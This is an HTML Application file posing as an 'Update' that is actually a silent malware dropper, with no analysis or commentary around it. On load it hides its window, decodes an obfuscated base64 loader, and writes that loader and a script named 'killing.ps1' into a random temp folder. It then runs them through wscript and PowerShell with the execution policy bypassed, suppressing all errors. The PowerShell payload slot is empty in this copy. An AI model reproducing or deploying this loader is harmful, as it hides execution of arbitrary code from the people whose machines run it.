<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<title>Update</title>
<HTA:APPLICATION
    ID="App"
    APPLICATIONNAME="Update"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
    SYSMENU="no"
    CAPTION="no"
    BORDER="none"
    INNERBORDER="no"
    SCROLL="no"
    MAXIMIZEBUTTON="no"
    MINIMIZEBUTTON="no"
/>
<script language="JavaScript">
window.onload = function () {
    try {
        var _B = "";
        var _L = "dmFyIHNoID0gbmV3IEFjdGl2ZVhPYmplY3QoIldTY3JpcHQuU2hlbGwiKTsNCnNoLlJ1bigncG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJw0KICAgICsgV1NjcmlwdC5Bcmd1bWVudHMoMCkgKyAnIicsIDAsIHRydWUpOw0K";

        var _A = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        function b64(s) {
            s = s.replace(/[^A-Za-z0-9+/=]/g, "");
            var o = [], i = 0;
            while (i < s.length) {
                var a = _A.indexOf(s.charAt(i++)),
                    b = _A.indexOf(s.charAt(i++)),
                    c = _A.indexOf(s.charAt(i++)),
                    d = _A.indexOf(s.charAt(i++));
                o.push(((a << 2) | (b >> 4)) & 0xFF);
                if (c !== -1) o.push(((b << 4) | (c >> 2)) & 0xFF);
                if (d !== -1) o.push(((c << 6) | d) & 0xFF);
            }
            return o;
        }
        function dec(s) {
            var bytes = b64(s), txt = "";
            for (var i = 0; i < bytes.length; i++) {
                txt += String.fromCharCode(bytes[i]);
            }
            return txt;
        }

        var psTxt  = dec(_B);
        var ldTxt  = dec(_L);

        var shell = new ActiveXObject("WScript.Shell");
        var fso   = new ActiveXObject("Scripting.FileSystemObject");
        var tmp   = fso.GetSpecialFolder(2);

        var chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        var name  = "";
        for (var j = 0; j < 10; j++) {
            name += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        var dir = fso.BuildPath(tmp.Path, name);
        fso.CreateFolder(dir);

        var psPath = fso.BuildPath(dir, "killing.ps1");
        var f1 = fso.CreateTextFile(psPath, true);
        f1.Write(psTxt);
        f1.Close();

        var jsPath = fso.BuildPath(dir, "update.js");
        var f2 = fso.CreateTextFile(jsPath, true);
        f2.Write(ldTxt);
        f2.Close();

        shell.Run('cmd.exe /c wscript.exe "' + jsPath + '" "' + psPath + '"', 0, false);
    } catch (e) {
        // silent
    }
    window.close();
};
</script>
</head>
<body></body>
</html>
